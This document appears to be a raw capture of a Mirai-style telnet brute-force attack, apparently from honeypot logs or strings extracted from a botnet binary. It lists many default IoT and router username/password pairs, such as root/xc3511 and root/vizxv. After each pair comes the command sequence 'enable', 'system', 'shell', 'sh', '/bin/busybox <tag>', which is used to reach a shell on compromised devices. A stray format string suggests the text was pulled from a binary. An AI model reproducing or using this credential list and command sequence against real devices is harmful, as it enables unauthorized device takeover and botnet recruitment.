r00t
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

centuryl1nk
enable
system
shell
sh
/bin/busybox ig5tlcdy
db2fenc1

ibmdb2
enable
system
shell
sh
/bin/busybox ig5tlcdy
4dgifts
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

m
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

video
enable
system
shell
sh
/bin/busybox ig5tlcdy
administrator

1234
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

admin
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

zlxx.
enable
system
shell
sh
/bin/busybox ig5tlcdy
nsroot

nsroot
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

admin
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

infoblox
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

qwe123
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

vizxv
enable
system
shell
sh
/bin/busybox ig5tlcdy
superuser
enable
system
shell
sh
/bin/busybox ig5tlcdy
informix

informix
enable
system
shell
sh
/bin/busybox ig5tlcdy
alphanetworks

wrgg15_di524
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

4321
enable
system
shell
sh
/bin/busybox ig5tlcdy
tech
enable
system
shell
sh
/bin/busybox ig5tlcdy
iclock

timely
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

123
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

switch
enable
system
shell
sh
/bin/busybox ig5tlcdy
mpi
enable
system
shell
sh
/bin/busybox ig5tlcdy
apc

apc
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

changemenow
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

antslq
enable
system
shell
sh
/bin/busybox ig5tlcdy
diag

danger
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

权限
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

nagiosxi
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

zte521
enable
system
shell
sh
/bin/busybox ig5tlcdy
888888

888888
enable
system
shell
sh
/bin/busybox ig5tlcdy
ascend
enable
system
shell
sh
/bin/busybox ig5tlcdy
sync
enable
system
shell
sh
/bin/busybox ig5tlcdy
support

support
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

tl789
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin
enable
system
shell
sh
/bin/busybox ig5tlcdy
db2inst1

db2inst1
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

openvpnas
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

centreon
enable
system
shell
sh
/bin/busybox ig5tlcdy
secret
enable
system
shell
sh
/bin/busybox ig5tlcdy
666666

666666
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

ascend
enable
system
shell
sh
/bin/busybox ig5tlcdy
qmik
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

123456
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

diamond
enable
system
shell
sh
/bin/busybox ig5tlcdy
operator
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

54321
enable
system
shell
sh
/bin/busybox ig5tlcdy
stoogr
enable
system
shell
sh
/bin/busybox ig5tlcdy
netics
enable
system
shell
sh
/bin/busybox ig5tlcdy
root
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

888888
enable
system
shell
sh
/bin/busybox ig5tlcdy
sysadm

anicust
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

ikwb
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

password
enable
system
shell
sh
/bin/busybox ig5tlcdy
oracle

oracle
enable
system
shell
sh
/bin/busybox ig5tlcdy
intrastack

asante
enable
system
shell
sh
/bin/busybox ig5tlcdy
glftpd

glftpd
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

qwerty
enable
system
shell
sh
/bin/busybox ig5tlcdy
outofbox
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

pass
enable
system
shell
sh
/bin/busybox ig5tlcdy
1234
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

1234
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

abc123
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

666666
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

permit
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

comcomcom
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

d13hh[
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

1111
enable
system
shell
sh
/bin/busybox ig5tlcdy
draytek

1234
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

arkeia
enable
system
shell
sh
/bin/busybox ig5tlcdy
ubnt

ubnt
enable
system
shell
sh
/bin/busybox ig5tlcdy
db2inst1

ibmdb2
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

artica
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin1

password
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

blender
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

anko
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

d13hh[
enable
system
shell
sh
/bin/busybox ig5tlcdy
adminttd

adminttd
enable
system
shell
sh
/bin/busybox ig5tlcdy
user

forgot
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

p@55w0rd!
enable
system
shell
sh
/bin/busybox ig5tlcdy
jack
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

xmhdipc
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

openelec
enable
system
shell
sh
/bin/busybox ig5tlcdy
lp
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

7ujmko0vizxv
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

12345
enable
system
shell
sh
/bin/busybox ig5tlcdy
administrator

admin
enable
system
shell
sh
/bin/busybox ig5tlcdy
public

public
enable
system
shell
sh
/bin/busybox ig5tlcdy
password
enable
system
shell
sh
/bin/busybox ig5tlcdy
cellit

cellit
enable
system
shell
sh
/bin/busybox ig5tlcdy
hpsupport

badg3r5s
enable
system
shell
sh
/bin/busybox ig5tlcdy
guest

guest
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

dottie
enable
system
shell
sh
/bin/busybox ig5tlcdy
atc123
enable
system
shell
sh
/bin/busybox ig5tlcdy
user

user
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

fivranne
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

cisco
enable
system
shell
sh
/bin/busybox ig5tlcdy
super

debug
enable
system
shell
sh
/bin/busybox ig5tlcdy
friday
enable
system
shell
sh
/bin/busybox ig5tlcdy
adm
enable
system
shell
sh
/bin/busybox ig5tlcdy
default

video
enable
system
shell
sh
/bin/busybox ig5tlcdy
adtran
enable
system
shell
sh
/bin/busybox ig5tlcdy
ezsetup
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

changeme
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

12345
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

f00b@r
enable
system
shell
sh
/bin/busybox ig5tlcdy
debug

synnet
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

smcadmin
enable
system
shell
sh
/bin/busybox ig5tlcdy
diag

switch
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

123456
enable
system
shell
sh
/bin/busybox ig5tlcdy
chronos

facepunch
enable
system
shell
sh
/bin/busybox ig5tlcdy
password
enable
system
shell
sh
/bin/busybox ig5tlcdy
administrator

changeme
enable
system
shell
sh
/bin/busybox ig5tlcdy
nasadmin

nasadmin
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

anni2013
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

xc3511
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

netoptics
enable
system
shell
sh
/bin/busybox ig5tlcdy
admin

54321
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

nasadmin
enable
system
shell
sh
/bin/busybox ig5tlcdy
root

0p3nm35h
enable
system
shell
sh
/bin/busybox ig5tlcdy
cellit

cellit
enable
system
shell
sh
/bin/busybox agd99xtv
hpsupport

badg3r5s
enable
system
shell
sh
/bin/busybox agd99xtv
guest

guest
enable
system
shell
sh
/bin/busybox agd99xtv
root

dottie
enable
system
shell
sh
/bin/busybox agd99xtv
atc123
enable
system
shell
sh
/bin/busybox agd99xtv
user

user
enable
system
shell
sh
/bin/busybox agd99xtv
root

fivranne
enable
system
shell
sh
/bin/busybox agd99xtv
admin

cisco
enable
system
shell
sh
/bin/busybox agd99xtv
super

debug
enable
system
shell
sh
/bin/busybox agd99xtv
friday
enable
system
shell
sh
/bin/busybox agd99xtv
adm
enable
system
shell
sh
/bin/busybox agd99xtv
default

video
enable
system
shell
sh
/bin/busybox agd99xtv
adtran
enable
system
shell
sh
/bin/busybox agd99xtv
ezsetup
enable
system
shell
sh
/bin/busybox agd99xtv
admin

changeme
enable
system
shell
sh
/bin/busybox agd99xtv
admin

12345
enable
system
shell
sh
/bin/busybox agd99xtv
root

f00b@r
enable
system
shell
sh
/bin/busybox agd99xtv
debug

synnet
enable
system
shell
sh
/bin/busybox agd99xtv
admin

smcadmin
enable
system
shell
sh
/bin/busybox agd99xtv
diag

switch
enable
system
shell
sh
/bin/busybox agd99xtv
admin

123456
enable
system
shell
sh
/bin/busybox agd99xtv
chronos

facepunch
enable
system
shell
sh
/bin/busybox agd99xtv
password
enable
system
shell
sh
/bin/busybox agd99xtv
administrator

changeme
enable
system
shell
sh
/bin/busybox agd99xtv
nasadmin

nasadmin
enable
system
shell
sh
/bin/busybox agd99xtv
root

anni2013
enable
system
shell
sh
/bin/busybox agd99xtv
root

xc3511
enable
system
shell
sh
/bin/busybox agd99xtv
admin

netoptics
enable
system
shell
sh
/bin/busybox agd99xtv
admin

54321
enable
system
shell
sh
/bin/busybox agd99xtv
root

nasadmin
enable
system
shell
sh
/bin/busybox agd99xtv
root

0p3nm35h
enable
system
shell
sh
/bin/busybox agd99xtv
root

1111
enable
system
shell
sh
/bin/busybox agd99xtv
enablediag

ironport
enable
system
shell
sh
/bin/busybox agd99xtv
corecess

corecess
enable
system
shell
sh
/bin/busybox agd99xtv
root

dreambox
enable
system
shell
sh
/bin/busybox agd99xtv
db2as

db2as
enable
system
shell
sh
/bin/busybox agd99xtv
user

debug
enable
system
shell
sh
/bin/busybox agd99xtv
ssa

ssa
enable
system
shell
sh
/bin/busybox agd99xtv
root

testpass123
enable
system
shell
sh
/bin/busybox agd99xtv
admin

ironport
enable
system
shell
sh
/bin/busybox agd99xtv
adtran
enable
system
shell
sh
/bin/busybox agd99xtv
admin

fliradmin
enable
system
shell
sh
/bin/busybox agd99xtv
root

default
enable
system
shell
sh
/bin/busybox agd99xtv
supervisor
enable
system
shell
sh
/bin/busybox agd99xtv
dbadmin

sq!us3r
enable
system
shell
sh
/bin/busybox agd99xtv
root

klv123
enable
system
shell
sh
/bin/busybox agd99xtv
help
enable
system
shell
sh
/bin/busybox agd99xtv
root

gforge
enable
system
shell
sh
/bin/busybox agd99xtv
root

toor
enable
system
shell
sh
/bin/busybox agd99xtv
mediator

mediator
enable
system
shell
sh
/bin/busybox agd99xtv
root

ggdaseuaimhrke
enable
system
shell
sh
/bin/busybox agd99xtv
root

1234
enable
system
shell
sh
/bin/busybox agd99xtv
mg3500

merlin
enable
system
shell
sh
/bin/busybox agd99xtv
root

nas4free
enable
system
shell
sh
/bin/busybox agd99xtv
root

realtek
enable
system
shell
sh
/bin/busybox agd99xtv
root

jvbzd
enable
system
shell
sh
/bin/busybox agd99xtv
trans

trans
enable
system
shell
sh
/bin/busybox agd99xtv
root

system
enable
system
shell
sh
/bin/busybox agd99xtv
craft
enable
system
shell
sh
/bin/busybox agd99xtv
supervisor

supervisor
enable
system
shell
sh
/bin/busybox agd99xtv
ftp

video
enable
system
shell
sh
/bin/busybox agd99xtv
nokia
enable
system
shell
sh
/bin/busybox agd99xtv
monitor

monitor
enable
system
shell
sh
/bin/busybox agd99xtv
root

qwertyuiop
enable
system
shell
sh
/bin/busybox agd99xtv
root

123456789
enable
system
shell
sh
/bin/busybox agd99xtv
manage

!manage
enable
system
shell
sh
/bin/busybox agd99xtv
root

ikwd
enable
system
shell
sh
/bin/busybox agd99xtv
installer

installer
enable
system
shell
sh
/bin/busybox agd99xtv
root

alpine
enable
system
shell
sh
/bin/busybox agd99xtv
root

root
enable
system
shell
sh
/bin/busybox agd99xtv
root

juantech
enable
system
shell
sh
/bin/busybox agd99xtv
super

forgot
enable
system
shell
sh
/bin/busybox agd99xtv
manuf

xxyyzz
enable
system
shell
sh
/bin/busybox agd99xtv
user
enable
system
shell
sh
/bin/busybox agd99xtv
patrol

patrol
enable
system
shell
sh
/bin/busybox agd99xtv
admin

2222
enable
system
shell
sh
/bin/busybox agd99xtv
root

arcsight
enable
system
shell
sh
/bin/busybox agd99xtv
admin

admin1234
enable
system
shell
sh
/bin/busybox agd99xtv
netman
enable
system
shell
sh
/bin/busybox agd99xtv
md110

help
enable
system
shell
sh
/bin/busybox agd99xtv
backdoor
enable
system
shell
sh
/bin/busybox agd99xtv
root

7ujmko0admin
enable
system
shell
sh
/bin/busybox agd99xtv
wproot

cat1029
enable
system
shell
sh
/bin/busybox agd99xtv
administrator

ggdaseuaimhrke
enable
system
shell
sh
/bin/busybox agd99xtv
root

idirect
enable
system
shell
sh
/bin/busybox agd99xtv
root

hi3518
enable
system
shell
sh
/bin/busybox agd99xtv
tutor
enable
system
shell
sh
/bin/busybox agd99xtv
admin

administrator
enable
system
shell
sh
/bin/busybox agd99xtv
wank

wank
enable
system
shell
sh
/bin/busybox agd99xtv
admin

1111111
enable
system
shell
sh
/bin/busybox agd99xtv
admin

9999
enable
system
shell
sh
/bin/busybox agd99xtv
rewt

satori
enable
system
shell
sh
/bin/busybox agd99xtv
cliuser

cliuser
enable
system
shell
sh
/bin/busybox agd99xtv
root

alien
enable
system
shell
sh
/bin/busybox agd99xtv
root

raspi
enable
system
shell
sh
/bin/busybox agd99xtv
private
enable
system
shell
sh
/bin/busybox agd99xtv
3ascotel
enable
system
shell
sh
/bin/busybox agd99xtv
system

manager
enable
system
shell
sh
/bin/busybox agd99xtv
demos
enable
system
shell
sh
/bin/busybox agd99xtv
intraswitch

asante
enable
system
shell
sh
/bin/busybox agd99xtv
root

klv1234
enable
system
shell
sh
/bin/busybox agd99xtv
admin

bintec
enable
system
shell
sh
/bin/busybox agd99xtv
netscreen

<<< %s(un='%s') = %u
enable
system
shell
sh
/bin/busybox agd99xtv
toor
enable
system
shell
sh
/bin/busybox agd99xtv
root

cat1029
enable
system
shell
sh
/bin/busybox agd99xtv
root

wh00t!
enable
system
shell
sh
/bin/busybox agd99xtv
cmc

password
enable
system
shell
sh
/bin/busybox agd99xtv
hax0r
enable
system
shell
sh
/bin/busybox agd99xtv
mobile

alpine
enable
system
shell
sh
/bin/busybox agd99xtv
backdoor
enable
system
shell
sh
/bin/busybox agd99xtv
manager

manager
enable
system
shell
sh
/bin/busybox agd99xtv
root

indigo
enable
system
shell
sh
/bin/busybox agd99xtv
root

00000000
enable
system
shell
sh
/bin/busybox agd99xtv
root

dasdec1
enable
system
shell
sh
/bin/busybox agd99xtv
admin

123456
enable
system
shell
sh
/bin/busybox agd99xtv
security

security
enable
system
shell
sh
/bin/busybox agd99xtv
tech

tech
enable
system
shell
sh
/bin/busybox agd99xtv
admin

pass
enable
system
shell
sh
/bin/busybox agd99xtv
swift

swift
enable
system
shell
sh
/bin/busybox agd99xtv
root

abc123
enable
system
shell
sh
/bin/busybox agd99xtv
root

tandberg
enable
system
shell
sh
/bin/busybox agd99xtv
